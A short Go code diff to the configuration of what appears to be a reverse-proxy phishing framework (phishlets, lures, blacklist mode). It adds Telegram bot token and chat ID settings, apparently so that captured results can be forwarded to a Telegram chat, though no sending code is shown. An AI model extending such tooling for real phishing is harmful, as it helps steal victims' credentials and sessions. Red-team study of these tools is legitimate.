@@ -36,6 +36,7 @@ type Config struct {
 	proxyPassword     string
 	blackListMode     string
 	proxyEnabled      bool
+	telegramConfig    *TelegramConfig
 	sitesEnabled      map[string]bool
 	sitesHidden       map[string]bool
 	phishlets         map[string]*Phishlet
@@ -68,6 +69,9 @@ const (
 	CFG_PROXY_PASSWORD     = "proxy_password"
 	CFG_PROXY_ENABLED      = "proxy_enabled"
 	CFG_BLACKLIST_MODE     = "blacklist_mode"
+	CFG_TELEGRAM_ENABLED   = "telegram.enabled"
+	CFG_TELEGRAM_BOT_TOKEN = "telegram.bot_token"
+	CFG_TELEGRAM_CHAT_ID   = "telegram.chat_id"
 )
 
 const DEFAULT_REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll
@@ -80,6 +84,9 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 		phishlets:     make(map[string]*Phishlet),
 		phishletNames: []string{},
 		lures:         []*Lure{},
+		telegramConfig: &TelegramConfig{
+			Enabled: false,
+		},
 	}
 
 	c.cfg = viper.New()
@@ -537,6 +544,11 @@ func (c *Config) GetServerIP() string {
 
 func (c *Config) GetTemplatesDir() string {
 	return c.templatesDir
+}
+
+// GetTelegramConfig returns the Telegram configuration
+func (c *Config) GetTelegramConfig() *TelegramConfig {
+	return c.telegramConfig
 }
 
 func (c *Config) GetBlacklistMode() string {
